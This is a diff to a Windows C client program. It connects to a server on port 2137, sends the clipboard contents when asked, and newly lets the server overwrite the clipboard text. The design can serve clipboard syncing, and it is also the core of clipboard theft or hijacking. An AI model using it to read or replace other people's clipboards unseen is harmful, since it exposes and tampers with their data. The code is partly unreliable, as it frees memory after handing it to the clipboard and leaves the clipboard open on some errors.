@@ -12,7 +12,38 @@
 #define DEFAULT_PORT "2137"
 WSADATA wsaData;
 
+int setClipboardText(const char *text) {
+    // Open the clipboard
+    if (OpenClipboard(NULL)) {
+        // Clear the clipboard
+        EmptyClipboard();
 
+        // Allocate memory for the text in the clipboard
+        size_t size = strlen(text) + 1; // +1 for null terminator
+        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
+        if (hGlobal) {
+            // Lock memory and copy the text into the allocated memory
+            char *clipboardData = (char *)GlobalLock(hGlobal);
+            if (clipboardData) {
+                strcpy(clipboardData, text); // Copy the string to clipboard data
+                GlobalUnlock(hGlobal);
+
+                // Set the clipboard data for CF_TEXT (ANSI text format)
+                SetClipboardData(CF_TEXT, hGlobal);
+            }else
+                return 1;
+            GlobalFree(hGlobal);
+        }else
+            return 1;
+
+        // Close the clipboard
+        CloseClipboard();
+    } else {
+        printf("Failed to open clipboard.\n");
+        return 1;
+    }
+    return 0;
+}
 
 LPCWSTR GetClipboardText() {
     if (!OpenClipboard(NULL)) {
@@ -106,12 +137,6 @@ int sendClipboard(SOCKET socket) {
 
 int main()
 {
-    LPCWSTR str = GetClipboardText();
-    wprintf(L"Clipboard contents: %ls\n", str);
-   // size_t sizeInBytes = (wcslen(str) + 1) * sizeof(wchar_t);
-    //printf("l: %ld\n", sizeInBytes);
-
-
 
     int iResult;
 
@@ -190,16 +215,25 @@ int main()
         }
         printf("Received HEADER: %d\n", msg.header);
         if(msg.header == SIGNAL_CLIPBOARD)
-        {
             sendClipboard(ConnectSocket);
-            //msg.header = GET_CLIPBOARD;
-            //char p[] = "foo";
-            //strcpy(msg.payload, p);
-            //send(ConnectSocket, (char *)&msg, sizeof(MESSAGE), 0);
+        if(msg.header == SIGNAL_CLOSE)
+            break;
+        if(msg.header == SIGNAL_CLIPBOARD_SET)
+        {
+            if(setClipboardText(msg.payload))
+                msg.header = RESPONSE_FAILED;
+            else
+                msg.header = RESPONSE_OK;
+
+            memset(msg.payload, 0, 512);
+            msg.hasNext = NEXT_FALSE;
+            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+
+
+
         }
-
     }
-
+    closesocket(ConnectSocket);
 
     return 0;
 }
